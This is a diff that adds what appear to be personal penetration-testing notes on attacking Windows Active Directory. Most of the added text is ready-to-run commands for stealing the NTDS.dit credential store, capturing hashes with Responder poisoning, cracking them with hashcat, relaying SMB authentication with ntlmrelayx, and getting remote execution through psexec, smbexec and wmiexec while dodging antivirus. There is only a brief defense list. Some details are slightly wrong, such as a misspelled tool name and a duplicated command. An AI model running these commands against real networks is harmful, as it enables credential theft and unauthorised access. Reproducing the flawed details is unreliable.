@@ -72,3 +72,100 @@ FingerPrint Module is:ON
 Serving Executable via HTTP&amp;WPAD is:OFF
 Always Serving a Specific File via HTTP&amp;WPAD is:OFF
 ```
+
+# Attacking:
+### Data Store:
+```
+%SystemRoot%\NTDS\Ntds.dit
+C:\Windows\NTDS\Ntds.dit
+```
+always check for this file and grab it. only accessible through the domian controller and contains everything in Active Directory. 
+
+
+## LLMNR Poisoning: 
+#### Responder:
+gather hashes over the network passively 
+```
+sudo python /usr/share/responder/Responder.py -I eth0 -rdw -v 
+```
+```
+-I interface
+-r enable answers for netbios wredir suffix queries
+-d enable answers for netbios domain suffix queries
+-w start the WPAD rogue proxy server
+-v verbose
+```
+save hashses to file called hashes.txt
+
+#### Hashcat:
+using the password file rockyou.txt and the NTLM module to crack passwords
+```
+hashcat -m 5600 hashes.txt rockyou.txt --force
+```
+using the password file rockyou.txt to crack passwords
+```
+hashcat -m 5600 hashes.txt rockyou.txt --force
+```
+
+$ hashcat --help | grep SHA
+
+```
+   5500 | NetNTLMv1                                        | Network Protocols
+   5500 | NetNTLMv1+ESS                                    | Network Protocols
+   5600 | NetNTLMv2                                        | Network Protocols
+   1000 | NTLM                                             | Operating Systems
+   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols
+  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
+  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols
+    100 | SHA1                                             | Raw Hash
+  17400 | SHA3-256                                         | Raw Hash
+  17500 | SHA3-384                                         | Raw Hash
+  17600 | SHA3-512                                         | Raw Hash
+```
+
+
+##### LLMNR Poisoning Defense:
+1. Disable LLMNR
+2. Disable NBT-NS
+3. Require Network Access Control
+4. Require strong passwords (phrases) more than 14 characters
+
+
+## SMB attacks: How do I get Victim to try connecting to attack machine SMB??
+edit: /usr/share/responder/Responder.conf
+```
+SMB = Off
+HTTP = Off
+```
+everything else stays on
+
+#### NMAP
+check for open SMB port and check for SMB signing
+```
+sudo nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
+```
+look for smb2 enabled but not required (default for desktops)
+
+### ntmlrelayx.py
+1. installed with impacket
+2. run while responder is running
+```
+ntmlrelayx.py -tf targets.txt -smb2support -i
+```
+
+```
+-i interact
+-e example.exe: execute example.exe
+-c ls: run command ls
+```
+looking for it to dump SAM hashes or give you and SMB client shell for the known user. can use MSFvenom to create an executable payload and get reverse shell. or create a powershell script or CMD to run as a command to get a reverse shell or do something. 
+
+#### connecting: requires having cracked a hash
+1. can use MSFconsole to attack the tartget using exploit/windows/smb/psexec
+2. if that is getting stopped by antivirus try psexec.py 
+``` psexec.py <domain>.local/<user>:<password>@<ip-address> ```
+3. if that is getting stopped by antivirus try smbexec.py 
+``` smbexec.py <domain>.local/<user>:<password>@<ip-address> ```
+4. if that is getting stopped by antivirus try wmiexec.py 
+``` wmiexec.py <domain>.local/<user>:<password>@<ip-address> ```
+5. there is also a powershell version of psexec and other options that might be able to do the same thing. 
